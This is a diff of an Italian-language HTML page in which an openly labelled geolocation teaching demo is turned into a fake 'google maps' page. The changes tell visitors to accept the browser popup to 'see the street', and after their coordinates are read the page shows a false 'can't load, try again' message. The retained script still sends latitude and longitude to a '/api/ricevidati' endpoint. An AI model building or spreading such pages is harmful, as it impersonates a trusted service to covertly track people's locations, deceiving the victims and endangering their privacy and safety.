@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dimostrazione Didattica - Geolocalizzazione Automatica</title>
+    <title>google maps</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -28,8 +28,8 @@
 <body>
 
     <div class="container">
-        <h2>Localizzazione Automatica</h2>
-        <div id="risultato">Inizializzazione rilevamento posizione...</div>
+        <h2>Sto aprendo Google Maps...</h2>
+        <div id="risultato">accetta il popup per vedere la via</div>
     </div>
 
     <script>
@@ -46,14 +46,14 @@
                 return;
             }
 
-            risultato.innerHTML = "Richiesta posizione in corso... Controlla il pop-up del browser.";
+            risultato.innerHTML = "";
 
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    risultato.innerHTML = `Posizione trovata!<br>Latitudine: ${lat}<br>Longitudine: ${lon}<br><em>Invio automatico a Vercel...</em>`;
+                    risultato.innerHTML = `non riesco a caricare, riprova`;
 
                     // Invio automatico a Vercel (assicurati che il nome '/api/ricevidati' sia uguale al tuo file)
                     fetch('/api/ricevidati', {
